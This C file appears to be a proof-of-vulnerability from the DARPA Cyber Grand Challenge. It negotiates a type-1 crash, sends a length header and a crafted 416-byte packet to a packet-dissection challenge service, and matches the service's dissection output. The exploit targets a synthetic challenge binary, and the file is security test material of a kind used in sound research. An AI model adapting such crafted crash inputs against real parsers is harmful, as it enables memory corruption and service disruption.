#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xa0\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x88\x01\x00\x00\x80\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x80\x01\x00\x00"
         "\x3a\x2b\x73\xda\x4a\x14\xe3\xf8\xea\xcc\xbc\xb9\x2e\x06\x58\xfa"
         "\x92\xd2\xf2\x05\x1b\x00\x00\x00\x01\x00\x5a\x90\x46\x54\x57\x37"
         "\x67\xe4\xc0\x66\x51\x9b\xf5\x41\x00\xed\xa6\x97\x6d\x80\x03\x38"
         "\xc9\x9a\x25\x58\x1f\x41\x9e\xb1\xbd\xb5\xc4\xbe\x26\x1b\x36\x91"
         "\xcc\x28\x41\x00\x03\xb0\x01\x00\x3e\x41\x00\xe2\xa8\xf7\xc1\xfe"
         "\x9f\x5d\x45\x80\xda\x7f\xe3\xa4\x14\x92\x0b\xb3\x5a\x41\x00\xff"
         "\xc9\x86\x9e\xe3\xbe\x35\xcf\xed\x9a\x78\x05\xcf\x5d\x0e\x63\x9d"
         "\x71\xb6\x23\x46\xb6\x22\xb2\x95\x3b\x9b\x99\x63\x0c\xce\x38\x8c"
         "\x65\x8d\x72\x39\x92\xe9\x71\xee\xa9\x95\x6b\xcf\x77\x53\x5a\x67"
         "\x5a\x8f\x3d\x70\x05\x93\xed\x22\x5b\xdf\x72\x9c\xca\x2e\x43\xe5"
         "\x61\xfc\x79\x9d\x09\xcf\x82\x3e\x7e\x7a\xf0\x6c\x23\xed\xfd\xe7"
         "\x6b\xfc\x69\xf5\x1a\x3e\x73\x53\x0f\x3d\x13\x0d\x9f\xc6\xc9\xb6"
         "\x1a\x6a\x88\x26\x89\x1a\xc4\xe2\x52\x16\xb3\xe8\x38\xf3\xa5\xff"
         "\x59\x84\xc3\x79\xf0\xd7\x1a\x72\xbf\xa3\xd8\x87\x78\x41\x4b\x67"
         "\x5c\x3a\x7d\x87\xb9\x9c\x74\xde\x09\x02\x68\x12\x91\x59\xfb\xe6"
         "\x99\x4b\xd1\x8e\x29\x8c\x55\x28\xac\x18\x3e\x48\xb9\x4e\x89\x40"
         "\x99\x31\x7b\x04\x87\xfb\x72\xdb\xb3\x68\x29\xf8\x52\x94\xcf\x11"
         "\x82\xf2\xbe\x09\xf0\xb5\xcb\xaf\x70\x14\x90\x30\x84\xd8\xb7\x00"
         "\x76\xcc\x78\xd2\x5c\x81\xf0\xc9\x80\x6e\xbe\x13\x23\x69\xe0\x93"
         "\x63\xee\xfc\x36\x9a\x38\xc8\x35\x31\x47\x2b\x1d\x36\xac\xe9\xec"
         "\x40\x14\xec\xd6\xfa\xee\xbb\xb0\x69\xcd\x64\x50\x9c\xd7\xd6\x38"
         "\x81\x31\x50\x52\x42\x15\x57\x46\xf4\xc1\xb8\x7f\xad\x6d\xe8\xad"
         "\xd9\xa7\xbe\x1d\x9d\x58\xbb\xe2\x23\x8c\xa5\x5e\x90\x69\x5a\x1a"
         "\x72\x3d\x0d\x01\x00\x4f\x41\x00\x0d\x4b\x04\xc8\x80\x64\xf2\xbc";
      static unsigned int write_00001_00000_len = 416;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamasporocyst
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x73\x70\x6f\x72\x6f\x63"
         "\x79\x73\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
